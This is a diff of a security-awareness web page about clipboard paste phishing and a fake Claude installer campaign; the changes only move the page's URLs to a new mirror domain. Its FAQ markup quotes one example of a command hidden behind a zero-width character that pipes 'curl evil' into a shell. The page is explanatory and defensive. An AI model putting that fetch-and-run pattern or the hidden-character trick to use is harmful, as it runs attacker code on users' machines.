@@ -9,12 +9,12 @@
 <script type="application/ld+json">
 {"@context": "https://schema.org", "@type": "FAQPage", "mainEntity": [{"@type": "Question", "name": "What is phishing, exactly?", "acceptedAnswer": {"@type": "Answer", "text": "Phishing is a deception attack that tricks you into acting against your own interests — running an attacker's command, entering credentials on a fake page, or sending money to a scammer. Classic phishing arrives by email or text, but the October 2026 fake-installer campaign showed it can hide in your clipboard: the command you see and the bytes you paste are different things. Always verify before you act."}}, {"@type": "Question", "name": "How did the fake Claude installer attack work?", "acceptedAnswer": {"@type": "Answer", "text": "In October 2026, fake Claude installer sites promoted through search ads showed visitors a harmless-looking install command. Their Copy button placed a different command on the clipboard — one that fetched and ran a remote payload. Victims pasted and ran bytes they never saw. Campaign coverage reports 4 in 5 (80%) of these ClickFix-style attacks now arrive via search rather than email."}}, {"@type": "Question", "name": "What is a zero-width character, and why does it matter?", "acceptedAnswer": {"@type": "Answer", "text": "A zero-width character (like U+200B) is a real byte that renders as nothing on screen. Attackers hide commands after one: you see 'npm install widget' but the clipboard holds 'npm install widget[hidden]; curl evil | sh'. Your terminal executes the bytes, not the pixels. A byte inspector makes the hidden part visible before you paste."}}, {"@type": "Question", "name": "Can I check my clipboard before pasting?", "acceptedAnswer": {"@type": "Answer", "text": "Yes. The byte inspector on this page analyzes any text you paste into it — install commands, contract clauses, wallet addresses — and reports invisible unicode, ANSI escapes, direction overrides, suspicious launchers, and lookalike URLs with PASS, WARN, or BLOCK verdicts. Everything runs in your browser; nothing is uploaded. The open-source paste-truth-guard tool does the same from your terminal."}}, {"@type": "Question", "name": "Does a clean scan mean a command is safe to run?", "acceptedAnswer": {"@type": "Answer", "text": "No. A clean scan means no known deception markers were found — not that the command is safe. A perfectly visible malicious command still passes, because the tool checks whether what you see matches what you would paste, not whether the visible text itself is wise to run. Treat a clean scan as one check passed, not as permission."}}]}
 </script>
-<link rel="canonical" href="https://iceman2050.github.io/ingeniousai-security-checks-mirror/clipboard-paste-truth-check.html">
+<link rel="canonical" href="https://ingeniousai-security-checks-mirror-0e97b6.gitlab.io/clipboard-paste-truth-check.html">
 <meta property="og:title" content="What Is Phishing? The Clipboard Paste Attack — Try the Demo">
 <meta property="og:description" content="Copy this 'harmless' install command — then see what your clipboard REALLY holds. Interactive byte-level demo of the October 2026 fake-installer phishing campaign.">
 <meta property="og:type" content="article">
-<meta property="og:url" content="https://iceman2050.github.io/ingeniousai-security-checks-mirror/clipboard-paste-truth-check.html">
-<meta property="og:image" content="https://iceman2050.github.io/ingeniousai-security-checks-mirror/og-default.png">
+<meta property="og:url" content="https://ingeniousai-security-checks-mirror-0e97b6.gitlab.io/clipboard-paste-truth-check.html">
+<meta property="og:image" content="https://ingeniousai-security-checks-mirror-0e97b6.gitlab.io/og-default.png">
 <meta name="twitter:card" content="summary_large_image">
 <link rel="stylesheet" href="ecosystem.css">
 <style>
@@ -73,7 +73,7 @@ details p{margin-top:10px}
 .platline{font-size:13px;color:#6b7688;margin:18px 0;line-height:2}
 .platline a{color:#6ea8fe}
 </style>
-<script type="application/ld+json">{"@context": "https://schema.org", "@type": "Organization", "name": "Ingenious AI", "url": "https://iceman2050.github.io/ingeniousai-security-checks-mirror/"}</script>
+<script type="application/ld+json">{"@context": "https://schema.org", "@type": "Organization", "name": "Ingenious AI", "url": "https://ingeniousai-security-checks-mirror-0e97b6.gitlab.io/"}</script>
 </head>
 <body>
 <div class="wrap">
@@ -168,9 +168,9 @@ details p{margin-top:10px}
 
 <div class="sharebox">
 <strong>Share this check:</strong><br><br>
-<a href="https://twitter.com/intent/tweet?text=Copy%20this%20%27harmless%27%20install%20command%20%E2%80%94%20then%20see%20what%20your%20clipboard%20REALLY%20holds.%20Interactive%20phishing%20demo%20by%20Ingenious%20AI&url=https%3A%2F%2Ficeman2050.github.io%2Fingeniousai-security-checks-mirror%2Fclipboard-paste-truth-check.html">Post on X</a>
-<a href="https://wa.me/?text=What%20is%20phishing%3F%20It%20can%20hide%20in%20your%20clipboard.%20Try%20this%20interactive%20demo%3A%20https%3A%2F%2Ficeman2050.github.io%2Fingeniousai-security-checks-mirror%2Fclipboard-paste-truth-check.html">Share on WhatsApp</a>
-<a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Ficeman2050.github.io%2Fingeniousai-security-checks-mirror%2Fclipboard-paste-truth-check.html">Share on LinkedIn</a>
+<a href="https://twitter.com/intent/tweet?text=Copy%20this%20%27harmless%27%20install%20command%20%E2%80%94%20then%20see%20what%20your%20clipboard%20REALLY%20holds.%20Interactive%20phishing%20demo%20by%20Ingenious%20AI&url=https%3A%2F%2Fingeniousai-security-checks-mirror-0e97b6.gitlab.io%2Fclipboard-paste-truth-check.html">Post on X</a>
+<a href="https://wa.me/?text=What%20is%20phishing%3F%20It%20can%20hide%20in%20your%20clipboard.%20Try%20this%20interactive%20demo%3A%20https%3A%2F%2Fingeniousai-security-checks-mirror-0e97b6.gitlab.io%2Fclipboard-paste-truth-check.html">Share on WhatsApp</a>
+<a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fingeniousai-security-checks-mirror-0e97b6.gitlab.io%2Fclipboard-paste-truth-check.html">Share on LinkedIn</a>
 </div>
 
 <div class="feat">
